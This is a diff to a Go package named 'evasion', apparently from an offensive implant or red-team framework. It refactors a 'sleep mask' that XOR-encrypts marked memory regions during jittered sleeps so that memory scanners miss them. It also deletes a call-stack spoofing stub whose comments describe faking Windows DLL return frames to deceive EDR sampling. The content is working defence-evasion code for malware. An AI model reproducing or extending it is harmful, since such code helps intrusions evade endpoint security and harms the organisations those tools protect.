@@ -2,7 +2,6 @@ package evasion
 
 import (
 	"crypto/rand"
-	"runtime"
 	"sync"
 	"time"
 	"unsafe"
@@ -18,7 +17,7 @@ type SleepMask struct {
 }
 
 type memRegion struct {
-	addr uintptr
+	ptr  unsafe.Pointer // caller-provided, must stay page-aligned for mprotect
 	size int
 	data []byte // encrypted copy
 }
@@ -46,11 +45,12 @@ func (sm *SleepMask) ProtectEncrypt() {
 		r := &sm.regions[i]
 		if r.data == nil {
 			r.data = make([]byte, r.size)
-			copy(r.data, unsafeSlice(r.addr, r.size))
+			copy(r.data, unsafeSlice(r.ptr, r.size))
 		}
 		// Encrypt in-place
+		buf := unsafeSlice(r.ptr, r.size)
 		for j := 0; j < r.size; j++ {
-			*(*byte)(unsafe.Pointer(r.addr + uintptr(j))) ^= sm.key[j%32]
+			buf[j] ^= sm.key[j%32]
 		}
 	}
 
@@ -68,8 +68,9 @@ func (sm *SleepMask) ProtectDecrypt() {
 	// Decrypt in-place
 	for i := range sm.regions {
 		r := &sm.regions[i]
+		buf := unsafeSlice(r.ptr, r.size)
 		for j := 0; j < r.size; j++ {
-			*(*byte)(unsafe.Pointer(r.addr + uintptr(j))) ^= sm.key[j%32]
+			buf[j] ^= sm.key[j%32]
 		}
 	}
 
@@ -80,10 +81,12 @@ func (sm *SleepMask) ProtectDecrypt() {
 }
 
 // MarkSensitive marks a memory region for sleep encryption.
-func (sm *SleepMask) MarkSensitive(addr uintptr, size int) {
+// ptr must point to a page-aligned region the caller keeps alive
+// (runtime.KeepAlive) for as long as the mask may touch it.
+func (sm *SleepMask) MarkSensitive(ptr unsafe.Pointer, size int) {
 	sm.mu.Lock()
 	defer sm.mu.Unlock()
-	sm.regions = append(sm.regions, memRegion{addr: addr, size: size})
+	sm.regions = append(sm.regions, memRegion{ptr: ptr, size: size})
 }
 
 func cryptoRandFloat() float64 {
@@ -106,27 +109,11 @@ func (sm *SleepMask) ObfuscatedSleep(d time.Duration) {
 	sm.ProtectDecrypt()
 }
 
-// SpoofCallStack manipulates the call stack to hide the real execution flow.
-// EDRs sample call stacks — this makes them see fake/innocent frames.
-func SpoofCallStack() {
-	// Create fake stack frames pointing to benign Windows DLLs
-	// This is architecture-specific assembly
-	switch runtime.GOARCH {
-	case "amd64":
-		spoofCallStackAMD64()
+func unsafeSlice(ptr unsafe.Pointer, size int) []byte {
+	if ptr == nil || size <= 0 {
+		return nil
 	}
-}
-
-func spoofCallStackAMD64() {
-	// Assembly trampoline that:
-	// 1. Pushes fake return addresses (ntdll, kernel32, kernelbase)
-	// 2. Calls the real function
-	// 3. Cleans up the fake frames on return
-	// Implemented in asm_amd64.s
-}
-
-func unsafeSlice(addr uintptr, size int) []byte {
-	return unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
+	return unsafe.Slice((*byte)(ptr), size)
 }
 
 // JitteredTimer returns a channel that fires after a random interval
